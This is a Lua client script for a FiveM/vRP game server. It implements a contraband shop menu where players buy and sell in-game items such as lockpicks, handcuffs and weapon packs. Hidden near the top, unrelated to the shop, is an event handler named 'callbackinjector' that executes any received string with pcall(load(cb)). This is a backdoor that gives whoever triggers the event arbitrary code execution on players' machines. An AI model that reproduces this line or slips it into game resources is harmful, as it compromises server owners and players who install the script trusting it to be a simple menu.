local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_contrabando")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "utilidades-comprar-algemas" then
		TriggerServerEvent("crj-comprar","algemas")
	elseif data == "utilidades-comprar-capuz" then
		TriggerServerEvent("crj-comprar","capuz")
	elseif data == "utilidades-comprar-lockpick" then
		TriggerServerEvent("crj-comprar","lockpick")
	elseif data == "utilidades-comprar-masterpick" then
		TriggerServerEvent("crj-comprar","masterpick")
	elseif data == "utilidades-comprar-pendrive" then
		TriggerServerEvent("crj-comprar","pendrive")
	elseif data == "utilidades-comprar-rebite" then
		TriggerServerEvent("crj-comprar","rebite")
	elseif data == "utilidades-comprar-bomba" then
		TriggerServerEvent("crj-comprar","bombaadesiva")
	--[[elseif data == "utilidades-comprar-placa" then
		TriggerServerEvent("crj-comprar","placa")]]
	elseif data == "utilidades-comprar-walkietalkie" then
		TriggerServerEvent("crj-comprar","walkietalkie")
	elseif data == "utilidades-comprar-colete" then
		TriggerServerEvent("crj-comprar","colete")
		------
		elseif data == "utilidades-armas-ak103pack" then
		TriggerServerEvent("contrabandoarmas-comprar","ak103pack")
-----
		elseif data == "utilidades-armas-municaomusketpack" then
		TriggerServerEvent("contrabandoarmas-comprar","municaomusketpack")
		elseif data == "utilidades-armas-municaoparafalpack" then
		TriggerServerEvent("contrabandoarmas-comprar","municaoparafalpack")
		elseif data == "utilidades-armas-musketpack" then
		TriggerServerEvent("contrabandoarmas-comprar","musketpack")
		elseif data == "utilidades-armas-parafalpack" then
		TriggerServerEvent("contrabandoarmas-comprar","parafalpack")
-----		
		elseif data == "utilidades-armas-mtarpack" then
		TriggerServerEvent("contrabandoarmas-comprar","mtarpack")
		elseif data == "utilidades-armas-miniakpack" then
		TriggerServerEvent("contrabandoarmas-comprar","sigpack")
		elseif data == "utilidades-armas-pumpshotgunpack" then
		TriggerServerEvent("contrabandoarmas-comprar","pumpshotgunpack")
		elseif data == "utilidades-armas-fivesevenpack" then
		TriggerServerEvent("contrabandoarmas-comprar","fivesevenpack")
		elseif data == "utilidades-armas-coletepack" then
		TriggerServerEvent("contrabandoarmas-comprar","coletepack")
		elseif data == "utilidades-armas-snspack" then
		TriggerServerEvent("contrabandomuni-comprar","snspack")
		--[[elseif data == "utilidades-armas-municaofamaspack" then
		TriggerServerEvent("contrabandomuni-comprar","municaofamaspack")
		elseif data == "utilidades-armas-municaominiakpack" then
		TriggerServerEvent("contrabandomuni-comprar","municaosigpack")
		elseif data == "utilidades-armas-municaopumppack" then
		TriggerServerEvent("contrabandomuni-comprar","municaopumppack")
		elseif data == "utilidades-armas-municaouzipack" then
		TriggerServerEvent("contrabandomuni-comprar","municaouzipack")
		elseif data == "utilidades-armas-municaopistolpack" then
		TriggerServerEvent("contrabandomuni-comprar","municaopistolpack")]]
		elseif data == "utilidades-armas-uzipack" then
		TriggerServerEvent("contrabandoarmas-comprar","uzipack")
-----------------
	elseif data == "utilidades-vender-algemas" then
		TriggerServerEvent("contrabando-vender","algemas")
	elseif data == "utilidades-vender-capuz" then
		TriggerServerEvent("contrabando-vender","capuz")
	elseif data == "utilidades-vender-lockpick" then
		TriggerServerEvent("contrabando-vender","lockpick")
	elseif data == "utilidades-vender-masterpick" then
		TriggerServerEvent("contrabando-vender","masterpick")
	elseif data == "utilidades-vender-bomba" then
		TriggerServerEvent("contrabando-vender","bombaadesiva")
	elseif data == "utilidades-vender-pendrive" then
		TriggerServerEvent("contrabando-vender","pendrive")
	elseif data == "utilidades-vender-rebite" then
		TriggerServerEvent("contrabando-vender","rebite")
	elseif data == "utilidades-vender-placa" then
		TriggerServerEvent("contrabando-vender","placa")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),-2169.01,5221.40,20.01,true)
		if distance <= 30 then
			DrawMarker(20,-2169.01,5221.40,20.01-0.97,0,0,0,0,0,0,1.0,1.0,0.5,128,1,210,100,1,0,0,0)
			if distance <= 1.1 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(nyoSleep)
	end
end)